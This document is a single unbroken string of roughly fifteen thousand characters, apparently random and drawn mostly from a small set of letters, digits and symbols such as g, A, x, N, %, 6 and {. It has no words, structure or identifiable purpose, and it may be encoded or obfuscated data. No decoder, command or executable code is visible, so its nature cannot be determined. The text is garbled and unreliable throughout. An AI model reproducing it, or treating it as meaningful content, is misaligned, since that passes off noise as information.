g-AxNA%64t-6hgU{4QtNKg-6hELEN6-6}Ug{NLt-N-1x%AL6htA6tg4{hC6{AEAxIh4--EgxLhN{IEgt-gA6Ug4LIN6%{UALLEt%46%UUUNgLN4U4-h%UUAAAE4x4t-A6-UxtII-44-UhUUAIhIUxN-<LhL{IEIx%h--{EEAE%jxdg6A{EN%t6xU-gU%{gNAtNg%hUhUNgAIxI4xghh{LEIUI%%%gg{AUtEx4EgAg-LxLNxA%x6%6gAUA6I%4N-UUh{UANE xU%RAL{_A4tURghAhEUjNhIx6Rg{LELxthI-%E{A{%ExEgxA%Eh%U6NUIg-%%ghAUN4%eUpUhg6INIAx4hY{gELUL%t%4g%A-t{xAE4A4-gxgNNAtxx%xg6U66L%ANIU-h-U6NU:4)IUxN-?AaLUNNIe6vgUhNLsx14NT{gx{xA%4I4x%-6LAIALt%xA-U6LEMN{)txU{6hINIAx%L*UgI6NAg4T4g%Agt{xtx4A4-gxgNNAtxx%xg6U66L%ANIU-h%UhIUxEht-qEgULgUNEIIx%hgL{EAU4hI4gEg{NhtE4I4x6ggaUIA{Ig-%%ghAUEE%E49UggUxUgEAIE%%g6{UAg4%INgUg-N%tU4A4EgxgtUAA-tx%I%4UgUUNIENwg%UhIU4EgxxxggAhNLx4Vtx%hg{AItgtg-gqN{U{-I%xU%A%E{x{tNAt-xx6I6UNgNUIIx)ggL%LAIUtE%%-E{ULNNII{h6gELxLExA%x6m6gUALttxx6%hLnUItEIhg-h46gLANEIx-I-xh-LLIItx%hgU{IUNtg4xgE6hAhL44E4{hhUEAIAxxg40-I6{LgI%I--U-E{%{4EUtE%%g-{UtLNU4Is4UhAEAExE44KN6gUgAhx%xg%{6tN%NgtL4I-UALULN%IA_U-LA?L{4tIU66gILIUxxL4U%I-NUgtstgxA%t6xNxtAt-%x%NLANxI%Ig-U-6{%UNEU+hxUgIhxAhN-4E%U{ghNAIExxh%L6EUUthE4%E%{LhNEtItx-g%1hIU{Eg&%xggAhEA%A44U%ghxhgAAEEx%%66UUgt%EN%U%-L%NUtAtE%x%thAU-NxxIx4hghULIAN4gxUgIh4AgIxIg%AgN{xtPNxxh%{UINgNg#g4N6U6-E%IUxAxE6x6tLAN-Ix-I-ULgLUEIIG%g{%{AEUNEx%CE6U{NLIE{g6%E{x{EIAxx-l-ghA{tNxI6xh{rhINEEh%-g4-g{ALEExyIfxg-{LEINxxh%U6IhNNgtx%E-hUh{4tEt{ghhEUIUxIgtrGI-{{gE%E-0UyE6%64AUNEx%%-6UNLLUtI44hhUEUEIEtE44-6A6UEAlthxx{R6ULINx4hx-gE{UEgNU4IWx6h{LAEtUxhKU6I{xNhELxE-UhgN%Ngt{xt{thgU{Nt%tzg-L6ILUxLIEnNUt{-E{4g%E6h{xNcLLEq4x%-Lt{xA4&1-EhhU4N-N{%L4n-LhUUNx6tE%%gg{AU{Ex4EgU-EU%AgtA4t%x6ENNAEI%46-UUhUUAtt%xE{t6xU447FEgh{-L6NxE--6xtg6{gL{x(IN%gg6{EAEE6g6%U6{ELA4E-%xhUL%NA4tt6xt-E64tLNLI%QAgUhLt(NLdIxx6h{UAINNxg%x{E{tNhtUxI%XhgUxtIt{-g%4LIEgIhIU-E-L{hU4EE AxE6%{gAAN{4x%E{U{LN%tgxA%t6xUEtAt-%x%NLANxI%Ig-U-6{%UNEUkhxUgIhxAhN-4E%U{g{6AIExxh%L6EUUthE4%E%{LhNEtItx-g%RhIU{Eg>%xggAhEA%A44U%ghxhgAAEEx%%66UUgt%EN%U%-L%NUtAtE%x%thAU-NxxI4xghhULIAN4gaxhE6xAhEU4I:>6g{xEIE{%gT4UINgthtU%E%Lhh{4NExA4Eg%hgLAA{Ix7EhU6EA%Eg4A,tgx{EEAE-:xnNUAAxt%tg%U%6h%{NNUxh4L6E6xLhA-IE4xgh6LLEIUtE%%-6{UtLNx%:xxU6hLtIxg-6%U6I{jNgng-x--g4UUNUtA-h-U6NUoIht+xAg%hxU_xLI466gAAtA-x64%6t6hN6LA4IIx-h6UUILNIgxx6EgA{gI%tN-U--A%EUIAIE-x-t{AL-Ex7Iat6h{UAIEnxg%x{EhxNhtUxI<NhgUxtIt{-g%4LIEgIhIU-E-L{hU4EEQAxE6%{gAAN{4x%E{Uh4N%tgxA%t6xUEtAt-%x%NLANxI%Ig-U-6{%UNEU#hxUgIhxAhN-4E%U{ghNAIExxh%L6EUUthE4%E%{LhNEtItx-g% hIU{EgY%P-hUhEA%A44UghgALEUxth4U%IgYUgAx4IIx-h6{NIIgIg%x-hUA{EE%I-7UhghALINx4hxLgE{UEhN4WE^{UhAEEIEx%gb;6I{{Ngx%x-6U6EL%L4IU4IhK6INUNx%6xggAhNLx4Ftx%hg{AItgtg-g6xghAgA%xI44hgUEELNhxg-t6I64U%AN%Lxxhgh{EtNh%^?L-AN6A%Ix4A6A{xA%LgtA4E%x{E{%NhtIxE6A6E{4N6xAx-6x6NEAIxz%wghUh6A%NN4Ughg{LELxthI-%Eg%AgL%EgxA%N6xNTAUZL4Uht64EhIE}txh{UAg{EIA4%-x{LLALNNII{h6gELxA-xL4E-%g6UUAtEIgL-hUgUIIIag-h%UhIUxEgxxxhgA{%LxIIIxm-gLNLUxE-ILrxgLNnLLE{Ix%EU%UgALEIxU{L6LU%NAIUxL{5h{EtE%%6wN{thAt6EI%tB%{hhUAIExxhb-6EUUtgE%IE6A6-AxAN2A-xh%hgNUN64%xNgULhL6EIIx%hgL{EAU4gIU%IgxUhL-tExU6hg4AEA{Gh-E6I6xNgA?IIx{ggL%UgEAIE%%%4{UAgIxI{%AgEU%A6tUxg6%gNAUA-;%-U6A6EAxAtIAx--xUI{xEhIUkI%N{gLxIEI-%hgU{IL7tg4xgIg{AgL4xI-g6h6UAEALIh44-EUAUNtxIg=A%{hxNIE%GgxUgIhxAhEL4E%U{hhUAIE4-h6E6EAUAIx%4g-A6NUxtEI%>h-UhI{=EgIx-I-{LgU44I%gghgULELLthI4%E{A{NExtgxAT{6x{hILth%x-ULt{EE%I-QU{L6ULIN4%hgEgEAEtUNInECAUh{{tExg-i%I{EN6tht{4A%-LFUUtEt4g6%IALUmN%%tWAhU{%t%4UBAxE6%{gAU4gIA%I6hUgt%tg4{%tU%{NtUt-g%hUUAUEtxttXA--hxNIN4OgWUgI6NAgNA?ExA-EU%A-tU-LZxU_hxI6t{-IhgL6{IIxKE4gh%hANUID0%!--h64ttEgSUQN{b{gAANt4x%6ghN(AI4ExhhhUEAILxIhxU-EUU{IE%IA_UhhhUUNNn%yVU-Nh tfEUINO<Ur{ULtE%4Ehtgx{4IWt{%NhgUINt4LEdxL-U6Nt6A4IUxL-xhxULxLIE0NUtAUt%4IiY%-L6htA6tg4{hBgo{AN%tx4D{L6{NgNUII4Ngg6ULIN{4g-x-g{AL-Ex%;ZUULhUttE{-h6EUt{xNhtLxEhELUUNA{txxx-%UIUxN-IL-I-EhNttNg4ARE6%64AUtgIL3}gx{-ItEN%U%-L%NUtAtE4S%h6xE=A4xExxghhLLEIAIEx4g6LAUEN4I68Eg6NtL6E-IE%U{I{xA6EAxg{66UU{4LExfh-UhI{NEgIxx6-thEU4xLI{gg-4AItg4h4U!tg%{EItEN%U%Eh%U6NUxhxU%N6YNhNUtNx){=hUUNNd%Q8U-NhZtMEUItk%gENtLxE4-16EU{N-t-4xx-{6gtU6Ngt{g<-gh-t6IxmE-xh{LgL{xLtriLgUhNI6EU4{hLg4h-ExxU-g6LLt{6AttE44{L6LU%NAIUxL{?6xEtEhzh0{-Ah-tWE{ZE66U6ALILEP4%htgx{4I2t{%NhgL<{LA(txx-{t6xU44eI{-N{-AZULN/Ix.-UthxL4x^%NxN{U{NItE64t%Eg4ELA-tE4t-ghg{t4ttxx4{)h{NN4%%&xL-chxL-xtIEgUgEU%A6tU%h%I{EhxNhExxE%46%{N4Ltx-g%xLIEg46IUGI%?{gLLNA-6%%hx{At{x-IU%IgxUgt%tg4{%tU%{gNAtEJ%04hULgtxIA-A-46NLgEgIhg%ggh{Lt4%Ig%AgEU%U4tUxggxggUAAEI%x6-UhgL%AgIAxEg%66LUEgIx-I-{LgU44I%gghgULELLthI4%E{AhEL4E64E%6Lt{6A-EExU6I6xU6AAIg66%E{%LgEAt{9xgELUUEt%4g%Agt{xAEtAIE-%6gUALttxxE-UUh{4tEt{ghhEUIUxIgtawI-{{gE%EgI{*tUt{gLLNI4UhL-xUhAUtIIN-g6xAELxIhxU-I6>LgNx%gxxgh6LLEIAI--x-NAAEx4%4ggUg6U%LNtU%h%UgN{FI/tU4t%%6EEtAxt4gghNgNNUNN%tx6-thEU4xLI-QE-t{gAgNt-tixg4NBtE4N44hGgL{RAxt-gt%ghAUEE%E4kUggUxUzEAIE%%g6{UAg4%INgUg-N%tU4A4EgxgtUAA-tx%I--g4UUNUtA-h-U6NUHIhtUSI-x{hU-EE4Ugg-U{ILxth4L%E6UNhLUtI4x-hgLUENUxh446E6{EhIExIxxhg6mLIN{4gg%-gh{UtEgIth6-thNLgEx%h%Ugt{%AEYt4g-A6EL%L4IU+g6x6MLANE4%G6gU{gE%NN0UM-U%AUEAEEBxZt6A{-Ax4I4x%-6LELAxt-xL{L6xU-NL%Lxx-66ALgx6I6xIgh{gL6xt4ggUgEU%U4tUIE-%6gUUtgEUxI%xhgE6AgIAxE{%LULU4UIUxN-rA*LUNtI%}EUthxL4xY%E6{UgA-A{VLIc%L6U{N46tUx{hMgxLhNUII4Ngghx{NIUIE%%-6{UtUNLIZixg-NtLN4U4-h%UUAAAEEZ4h%xL0{4tEtx}h-LhENANEt4G6hAhEU_NhIx6<gg{-I6ENt4gEUgAxtgkLIP%L6U{N46E4xU%L6xUxAL%LxE-NAtEU4-Zx44hEh4tYNLI5cxg-NtLtEh4I%EgtE6AE4xxg-Ag{UxtIth-g-ULI{E4gBE-I-4h%UNxLI{gggUAtLhxQ4LjAL6{6LIthxg%6LtUgtUt4y%%NLUUENxxI4xgh64LEIUIEg%ggh{Lt4%4{.-gE{ELI4A4E8466AAA6EIxh-g66EtN-,Lx%h%h-UhA4%t_AhULRE84--6Xt-INLLEEN-t6{{LU%ItE64t%Eg4ELAEtNgthgULNgNI%L4T-LhUUNx6IUk{UL{hU-Ix%6h6-t{6AgE{-^?N6g{6AEtE46{66UU{4LIh4-6xLgt6AtI6<g-{A.L{IEIx%h--{EEAE%Kxag6A{EN%t6xU-gU%{gNAtNg%hUhUNgAIxI4xghh{LEIUI%%%gg{AUtEx4EgAg4hNAgtg4h6%6g{{Atx%x-6U6EL%L4IU4Eg%h-LUIgtU}I-4{gt6NE%txE{){-tA4x%5%g6A{tAxxx-E%-{x{NIAxx-%-gUUU6E%tN?Uhh6UUNAHIUx!UL6_U4NU4ggAgEh&LhEx-_%{{E{xNhE-xEWxhhU{NExU4Eg%h-LU4Ltxg3%xA6L{4I%g66gU{ILbtg-g6xg{AgL4xI-g6h6UAEALIh44-EUAUEA4I666-E6pUhNx%Sjgg-N6A%I4%Uh6-t{6AgE{-Y%{gA{-IWt{%Eh-ULNSIgxtgs-L6At6NUI{6Lgh6-Nx4h-6xtg6{gL{x!IU%IgxUhL-tExU-h6UUIAjIgxx6E6xLhALIE-A--UxUN4A!xg%ggLUL6t%IN%U{h{NL{Ex4x%%{I{xA-tL%I&xhhUUNIEN^g-xUE{AAgK%xNhUh-t%4UvAmEhxhtAAE-4xgI6-h4AUtU4A6h6U{NAsxhxU%t6%UE4ttg,A-E{%{4EU4g-x%I6UEhN4oEz{UhAEEIEx%gG96I{{Ngx%xg%{6tEtNgt{xt{thgULAIIU6L-EhNtt4Le{gggINLUyEL4UJNL6hEN%tgxAZ{6xUENAtE_%-6hULgtxtg_A-E{%U6EU4gg%-NLUL-x%%UgAgELxLttA4-%x{I{xA6EAxg{66UU{4LIh-g6xL{t6AtI6Wg-{A8L{IEIx%h--{EEAE%ax9g6A{EN%t6xU-gU%{gNAtNg%hUhUNgAIxI4xghh{LEIUI%%%gg{AUtEx4EgAg-LxLNxA%x6%6gAUA6I%4N-UUhUUAtt%xE{th-NUNE4%44gU6EA%E-4Ugg-U{IL4tg-6mEUthEtnt--A6xU_UgNAttxxhxLEU-txtNgAhxL%LgIUI6%%-N{UEhEUINQ_U;{ULNEf-f%UgN{sIXtU4N%&L5{UANEwxU%3AL{sA4tUighAhEUyNhIx6a-JhAA%ExI)hLg4N6LI4I44%%gNELNhxg-thtU4EXNLtA66-Uh{tL4-96YIUL6fLLEUINh6gU{{IL4x%6gx6AE6Ltt6xg%{L5UgN-%6Q%!4UEN_4?tLx#-xh-ttN{Ixx*gU{UUXx.4g%-L6U%U44E%xhZgL{vAxt-gt--UUUEE%E4cUhh6INEAx4h)UgIh.AgExGIxx6h{{tIxgxggxgAAALEI%x--UUg{INItxzh%LhELUIhINx{-xhxL%IIIxB-gLLIL44g4U%I-NUgLUtI44-g{x{gNAtNxxh.6UELAU2tx4{hLEEtNx4h.LgEAEtUN4zE7{UhAEEIEx%g3O6I{{Ngx%4g%{gtUgAt%64t%N6gUxIhIUxt-%hEttE-sUKE6%64AUNEx%%-6UAgLUtI44-gL6{EItEE-J--LANxIqIgHA-thxEx4EI--x-NAAEx4%4ggUg6U%LNtU%h%UgN{OIYtU4t%%6EEtAxt4gs-IUNEg4>tLxW-xh-ttE-Ihx4Ut{-EU44%66t{xALItt64hhc6gU-46I%I46EL%EQALtlxx--AtUgEAIE%%%4{UAgt%4g%Agt{xAE4U4E-%g6UUthE4%E%{LhNEtItx-g%QhIU{EgH%m{--hELENI&AwE-4{6EANEx%%g6Ah{AxtE%Uqh-xAIA{xg44hILgNhNUxExLgh64LEIAI4xNgg{gLh4%4gK{gtA%AgELII%ULLhxNhtUxIBNhgUxtEEA4gh%6NNUN-%%gUhAhENxNt4A:-gxLILxE-4LhLgx{-ALbL4x%6gAUg46tUx{{LL6N-txIA66%th6LgN{%lxUgIhxAhN-4E%U6h{UAIE^xg%x{EhxNhtUxIoehgUxtIt{-g%4LIEgIhIU-E-L{hU4EE_A7E-HhhLxx,4g%-L6U%Ex4E--h;gL{bAxt-gt--UUUEE%E4kUhh6INEAx4hHUgIhoAgExvIxx6h{{tIxgxggxgAAALEI%x--UUg{INItx!h%LhELUIht4-E-{AhEEIIIxgg-7{IL{tg%%%ggLhIAURL446g6UUILNIg4U-I64LgtxtgeA-NhxE5NU%LxU{th4th4E%tWx6h{LAExE-Ub4{E{{IhxE%I%xUg{DNIt{egh%hgU{Nt%t8g-{htttEgI{ktUt{gL{Et-t%gg{{tIttg4{%tLtUgA{ttgt-g6L{INU%LxE-NAtL-I{bggE{{LxtZNLIeixg-NtLxE4-:%{{NNgt4xUgLK(6LUUAN%6xU-{ALEgI4c{4NhUhNttN6IteE-4NLUxth4U%I-NUgAxtI4x-h6LUENUxgxU-IgdLgI%IgxL%IhUtLNLI%vAgUhLtcNc%t&4U6hIttNp-6vxUtUhthEO4A-%6x{b4Lt{-ghtUI{INLIgxt-xA2U4IN%UgxUt{6Lhx;4g%-L6AIE}ENg6ct66UgA{22xg--A6NNt3xEx{{B6LUvNxI-6t-xh4tZ4NKtgUg-NtL6Et4E 4LL{-AEEtxg-ggtEtAxt4gC%4gNNUIN%tx6-thEU4xLI{gg{xA{EAE4IN%g6g{ht%tg4{%tU%{gNAI%xx6E6UNhAUtN4S-U69tLA#t4xUggLALENaIhRxUnh4EExU%46%6g{{At^txg%LgIUU4LtExN{tLL{{Igt46L%1hLLUNN-6*N-Ih{I6EERx6{UgN6t6xUg6%tgIELAEtNgthgU{U-4tt6xt-E64tLNUogxLgIhLAhNI4E%U{h{NL{Ex4x%%{I{xA-tL%I-hUg{5NIt47gh%h{U-NEIExIhAhEU4E6bA!E-8hhLxxb4IgEgLUhA{tE%A%Eg4U646tE44-6A6UEA=thxx{7hgL-x6I--4hEA-t#NLIp9xg-NtLxE4-9b4{NAUIgxEgL2F6LUUAN%644-U6LUxNxtL6L-EhNttNNt{gg{ANLUqEL4UwNL6{%Ext6%A%4gNUgNgth-%-g6{UtI%t6-U%EL%UgN{ttfg-tN6UtNNIgrx{h{ULtE%4Ehtg6AULEx%xg%{6tEtNgtL4I-UALUENNixgh%{LgU4xLt)eLgUhNI6ENIIX{L6hEExx6-6h6U{A^46tt4I{L6EUN4tkU4{hg64tLATILRU-NN6L6Ix4ggAg4hNAgtg4h6%6g{{Atx%x-6Ug{N%N{t-xE-E6INANEt4&6hAhEU;NhIx6!-cLELx4h4UyNgJNVAUEN4dh:6U{NACaF446E6{EhIE%Lxx--hLtLNxI- LULhxL6NA4gh6g6hIAhtg46ht6-NLAgx%4g-A6EL%L4IU&g6xgI{UIht4-E-{AhEEIIIxgg-R{IL{tg%%9g6A{EN%N4xU-gh%UgNAttxx-EUUUEE%t6WUhh64NEN{%hgEhIhxEgNO4I {6gA%LgtA4E-%-4UUNg4xIIPUUh{4tEt{ghhEUIUxIgtd*I-{{gE%Ng%tjE6%64AUx64U%IgZUgIg4I4{6gg4NIIgxhxU6E6LLhA4IE-A%EA6LgEAt{^x{thxAhEL4E6E{hh4EEE{-h6E{I{xtgEMxI%{hgN%N-xUxEg%g4LUIhtx-E%x{hL{EEkAbN-Ih{I6EE>x%-UAAxtWtgxA%t6xU6AhXYxIhN{-AhAAx{44%U6tA{4tIggX-g{ALEEx%x<xg-{LEIEx4-%LLL{xA6EAxg{66UU{4L5g-4hEgNNUNN%tx6-thEU4xLI-8E-t{gAgNt-texg4N*tEx{-%666{ELL.tLxU%NA6U-txIgGA-thxNIE-t4_UgUhAEhEUIN^Z{hhTLAt%4x(MLLhNtgtUxIrNhgN%AtthxI-E6tt6AtxxxggA6{t%4{4Ugh-mhAA%ExIbhLgLAgLUtIIN-gL%{6tAEE3%i4hUNgAkxIxE-NA6U6I{k,6g-6htLEN4-LeEgNN6Lt4L%g>U6IhNIhxExEhEgtU6Ngt{g_%4UEUxEhILqEhA6EA%A4%AgIgxLELL4h4USNgYNdAUEt4%%E6gU-Itt6%46EgxLhA-dIggggAgU6NtIEx4ULh{EgEU4IbK6gA%LgtAI{h%UhUUtgE1%I%x6-UL4LExx-%L6xUL4=tLx{%xhEE%EgILxIgUNLL{4g4U%Ig,Ugt%tg4{%tLtUgA{ttgt-g6{Ut4tIgx{-tAtLgNLtI5UULhELNxt%Ug?{AL4EEE4-c,LgG{xA-Gt4x%4LWNEI6(%-66xh-t6AtI6Hg-{AkLgE--6/Nh4LEtg4t%UhL-({LAUENg6%U6{ELIgxt-{6N64E3ALtJxx--AtUtNhII=E-tN6LEIx4g%A-{{xLgtA4E%xU0hxNhtU-IhghgEgNgtL4I-UALUENN%tgUh_LA{4IEI46k-LhbLxE--tlg6A{EN%N4xU-g{x{{NAtEM%-6hULgI%IgxL%IhUtLNLI%+AgUhLteEUnE2x6hh-AENxxh%U6EAULEI%xg-ULL{xIjExg6-ULIEg46tIgx{EhEU4E6-6RE-4{6I6EEIfQhgxNvAgt-g66xUAAxtLtNgt%66tUEA4%Lx--E6tLgEgtt6t-xh4t8E{tNgU{xALt6R6It%66g{{I:E^4A-%6x{94Ltx-g-UhI{NEgtUMI-x{gNxNg4A1EgxA9LUxLIU6tgxNhtExt4hhULgU{A-tExE%IUAUEA4I6-A-Uh{EZNx4hx-gELUEgNU4IMx6hhLAEtU-U)Lge{xA-St4N6U6-E%IUxAxE%V6hUx4>t4-E-x{hLLEEsAHE-4{6EANEI4,6gE{6ItE64-RE6UAIAxt64A-gA6U6AIIhdg-6AtLgIUIE%%%4{UUEt%4g%U{ghUAIExxgh6gENtLExJxghAUxNfAACEgU-U6NUS4jIUxN-dAFLUNtI%:EUthxL4x<%E6h{EA-Ext-g6st66UgA{9exg--A6NxIAb6-L-NAtU6NtIEx4ULh4L%NN-L%h{gAEExxL%A66LL{iA%et4x%4LcU{LNxU-xhAUxt6AtI6=g-{AsUWNA4%ex-;NLL4x64IgI-xUhAUtIIN-g6xUIAxIhxL-EhUNgNUII4^ggL%UNIUI-6%{ULALEIxIt%Ag-{xEIE4%g%U6IhNNgEUxI%4hgAxAgIAxN-xLZUU4LtUgt-4AhEE4tIx%hgL{EtExUI4gEg{NhtE4I4x6ggMUIA{Ig-%--UUUEE%E4QUhhhINEAx4hHUgIhrAgExYIxx6h{{tIxgxggx6AAALEI%x--UUgUINItxYh%LhELUIht4-E-{AhEEIIIxgg-?{IL{tg%%?g6A{EN%N4xU-g{xhILUxh446E6{EhIExIxxhg6PLIN{4gg%-g{ALEt%t4%U6gU%AgtA4t%x6EAUAEI%46-UUh{4tEt{ghhEUIUxIgt=qI-{{gE%Ng4A)E6%64AUtgx%%g6A{tAxtE%U%Eh%{6NUxh446E6{EhIExIxxhg6)LIN{4gg%-g{ALEt%t4%U6gU%AgtA4t%x6EAUAEI%46-UUhUNA{txxx-%UIUxN-IL-I%x{hLUEItN%ggx{ILxth4L%E6UAgLUtI4x-hgLUENUxhxN%{6xUxN%xIxx--hLNINxI6xAggN6L6NI4h%gg6NtA-xLx%6%ggUAAEI%I4-UhgL%NgIAxt-xhENUNE4%x6gULhU4IEI{6h{ELILx4gI(%Ig{Ugt%t-%U%Eh%h4NUEEv%--hUNgAUIIx4ggA6UE4ttEgOg-AAEx4(4g%Agt{xtxxE4-gxgNNAtxx%xg6U66L%ANIU-h-{UEUxEht-qEhA{%NxNg4A5E6%{6AUtg%%ig6A{NI%xUxU6g6IAILxIhx{-EUUL%E%IgaA%thxLEIAI--x-NAAEx4%4ggUg6U%LNtU%hFU6I{xNhE-xE-UUg{%LExAx-6x6NEAIxV%+ghUh6A%NN4Ugh-U{ILxthI-%E6UUhAUtI4Q-g6xAEAxIh4L-EUAU-txtNgAhxL%LgIUI6%%-N{UEhNU4IKx6hh-AEtUxh%U6I{HNgtx%E%xhh{LNExAx-6x6NEAIxT%kghUh6A%NN4Ugh-U{ILxthI-%E6UUhAUtI4K-g6xAEAxIh4L-EUAUEA4I666-E6sUhNx%s/gg-N6LNIV:E6g{tAtILNy4L%UgNE6A6EIxh-g66EtANxUxEg%g4LUAE4%xNgULgUUEII{%gU6hEttNE%_wNUAAxt8tgxA%t6xNxIEtE4Y%h6xEiNgI-66hxLAE%ILDgD{UL6aLLEUINh6gNhIL{j6x%gxUUNgI6x{-U{66t{I4LtExN{th-{{IgvEg6{-AaULNHIxY-UthtLhEI4E)tL6{gtZEA-L%NU%U-AhE4gt-AUUN2I<H666-t6ItLNEIN6t{ULLA%xtI6dtgEh4ILEE4NhtUhALtgtIgL9^6LUUAN%6xU-{ALN&A-xx!AU66tL6EgI{6:-xLELxthI-%EghAgL%EgxA%g6xN<LxIh4xhILgLg4gEE-A-NUxELIAINxI-{N6LEIxIE6LgEU%L6tU4tjILL{4tgt{-IhgUh{UNItxYg6x6ALANNIx-I-xh-LLxLI{gg-4AItg4h4UgEgLUhL4tE%A%Eg {hAxK)446E6xLhNLIE-A-E64L6x6IEx2-hhxtrNU4I=x6hh-AEtU%gyU6I{xNhtLxE-UUh{4tEt{ghhEUIUxIgt&VI-{{gE%EgI{1tUt{gLLNI4UhLgE{NItxL%L-%Lt{6AttE44{LgxLhNUII4NgghxNEN-4hFUgIh0AgEx!I;{{gh4tIxg%h%U{E{LNhE4xE6A6E{zAhtxgP%UhIUxEht-5EgULgUUEIIx%hgL{EAUth4U%I-iUgAx4I4{6gg4NIIgxhxU6E6LLhA4IE-A-E64L6x6IEx4g6N6LEN446h6g4hNAgtg4h6%6g{{Atx%4t%h6IUEAt%6xNh%6gLANE4%44gU{gNxNg4A0E6%{6AUtg%% N{U{-I%xU%A%E{x{tNAt-xx6I64NgNUII4Ngg6ULIN44g66-g{ALNx%%U%UUUh4EEE{-h6E{I{xtgEQxI%{hgN%AgIAxEg%g4LUEgxxx{gAhEA%E64U%g{%hNEUE--%6U{A{EExEtxA%-6xAILxIhxU-IgNLgNxxE4xghhULIN#4gjxgIhxAhNL4E%U{hh4EEE{-h6E{I{xtgEnxI%{hgN%AgltxEg%g4LU46IUvI-*{gtgIII{gg-4AItg4h4UgEgLUhL4tE%A%N{xUgNAE{xx%ghAUNNxW.4xghh{EI4g4g6g-NLUL-x%%UgAgELxLttA4-%x{IhxNhtUxImNhgUxtEt-qh-UhIUHEgIx-Ig-64LUEUIAghgUhNL<4h4Uqtg%{EItEt4h%I6E{t46tN-%%ghAUEE%E4SUggUxUgEAIE%%g6{UAg4%INgUg-N%tU4A4EgxgtUAA-tx%I%4UgUUNIEN/g%UhIU4Eg%6xggAhNt%4U4U6U-4LEL{xh%EgIgxAgLWtI4{-gU%{gNAtEz%e4hULgtxt{_A-E{%L6EU4gg%-NLUL-x%%UgAgELxLttA4-%x{IhxNhtUxIsNhgUxtEEx3h-UhIU:EgIx0I-x{hULEE4Ugh-4LEL{xh%EgIgxAgLztI4{-gU%{gIttEH%G4hUE6NUIIxqggAgNIN{Qgx4{IAgEhEUfEBL6hh4AE4A4Ngx6gUAL{tx4g-A6NUxI+Ex<h-{LIEgEg%gxNhUh-t%4UfA3EhxhtAAE-4xgI-xUhAUtIIN-g6xAEA-IhxU-I68LgNxxIxx--hLtLNxI-jLULhxL-EL-LQxg-{LILEx46/A6gE6AUt{gL%4U-AxIUxx-I{t66UtNEt46L-EhNttE-(Lgx{UAgI6Nt46%gg{N;Agt-g6%N-4AEIgxt-g{Lg^ULNUtN66%4hUULNxIxxLULhELNxt4-x{{gAEtg4_-j#Lg2{xA-7t4t%h6IUEAt%64{6xhgLAA{Ixxt-hhILENt-6Zthx6IUxthI-%EUt{gI6Eg-Lb{L%NUILt%gghxgUNhAHtA5%-x6?tLN{2ggthIh4L%NN-Ldx{gh-ttExxhML6E{bA%.t4N6U6-E%IUxA4Eg%hgLUIgILjI-{{gE%EgI{3tUt{{L-EE4EBI{A{EL4t6%A%6gIUhNgt6gt/4UUUEE%E4!Uhh60UAE%IxxCUL6?EgNU4IxNUhANAE4A46vI6hUgA6Xt4t6UgEL%L4IUgh%LUI{xEht-CEhUh6E%NxI46L-LLNt6xUIL5Kgx{-ItEx44hLgJAttUEE1%J4LANxNxcx4?-LhUUNx6I--xgg{ALtExHIxx6hh-tIx%xggxgtAAAEE4x6{66E{oAhtxxU-{LMULI-xxxggA6{t%4U4U6U-Lh9LxE--tdN{U{EN%t6xU6hgUUILNYh-A-EUUU6I%Igx{-tAtUgN{tt,g-tN6UtNNIg^x{h{ULtE%4Ehtgt{hAItE4t{6g{AxNgIA4{-x6tUhNIIExtU6htNxAItx%h--{EttEg-6*gULh{I%xU-L%%LgNxLUxh4p%Ah%UxA,%Lx{hgLtNIN4I%xNULhxEgN-%t!x6hhLAEEZ4%htgNAUA-D%-U6AgEL%NgIU-g-LhIU{EgV%eg-{htttEgI{ tUt{gLLNI4UhLgE{NItt-%{6xUUNg46Etx6-g6{EvNgI-66-Ng4NE4g9EghUL60LLEUINh6-4U%AgtA4t%x6EAULEI%xg-Ag{UxNExAxE%k6hUx4!tixAg%hxUHxLI{gggU{IUNtgIU%Ig{UgI6EE-tJEUm{NIAxx-W-ghAUtNxHxgE-E64L6x6IEx_-hhxt0N3IA%%gxhiILE{%g%U6IhNNgEM4A-%6x{G4Ltw-g%%6gLAN-Ixgy-UALUU4tI{6h{EAtLhxU-gxE{A{6LIthxg%6Lth4tUxk-%--6h{44tIg-U--LeLgEAtt^xg6hhtoN-_ExNUhAEEINxxh%U6EAUAtI%I4-UUhUUANt ge-U6NUW4+IUxN-XA0LUNtI%5EUthxL4xn4{gtUgAEttvLIJ%L6U{N46tUx{{L64{-txCU-QhAAtU6NtIEx4ULh-LENt4g%g-tNtLxE4-z%{-NAUtxxL%Y{6gtU6Ngt{g(%06AL%Nxte6LghLhL{NAI-6Fg{LEt6x6%{hLg#{%ItEx44h36{AtI%n#4L%*6xU-4ttxx4{rh{NN46%+xL-2hxL-xtIx34UgAEEt4U4Nhtg6{tAEE4gL%-6E{tNgIg4t{t6xU44RI{-N{gAOULN>Ix_-UthgAAEEx%x46UUgExE{xA%Eh%U6NUIg-%%NUUU-4%SU-A-EUxUtEAI->xhI{-U4EU4UrA{h{ULNEk%h%I{E{xNhE-xEDxhhUINE^txg{66gELE%%%gU{LhEA%E64U6UUghNEUE--%6U{A{EExEtxA%-6xAILxt-4L%x6LE&ALt{4x-EL%LgNLtI>UUL{hEgEU4IxN6ghUAIthxgh6gENtLExmxAhAUxNvNgIAxt-xLxEEN-xxxN{ALxE%EgeUY66%hNAU4h4UTNgnN+AUEt4%%ELt{gIttEc%74hUE6NUIIxaggAgNIN{rgx4{IAgEhEU8EFL6hh4AE4A4E*466E6AEEr4h%xLRUgN-%6xN64UENx48tLxd-xh-ttNxI46jg{LEEU4N-t06gt{EL4DLIx-h6UUILNIgxx6EgxLhNUIIx,gghxLINx4hxLgE{UEhEUItS%gENtLgtA4E-%-4UUNg4x4{-A6EL%N6IU>gh%6NNUN-%%gUhAhENxNt4AT-gxLILxE-4LhLgx{6LAtgg6%U6{ELI%E-%x--A6{tN6Igx{{M6ULINx4hx-gE{UEgNU4I2x6h{LAEtU%hK4{E{{IhxE%I%xUg{yNIt{lgh%hgULAIIU6L%x{hLUEItN%ggxLEUxth4U%IgpUgAxtI4x-hgLUENUxh446E6{EhIExIxxhg6jLIN{4gg%ggh{Ltxt4gb{gtNtAgE{4tht6g{{AtVtx{%-6EUEAIxAxE%4h6NAN6tIOhggh6ttN6%Lx4{BhktLt%%%%-ghh4Itt-%U6mUnN646tt4I{L6EUN4tI--LhgLEtLA&IL 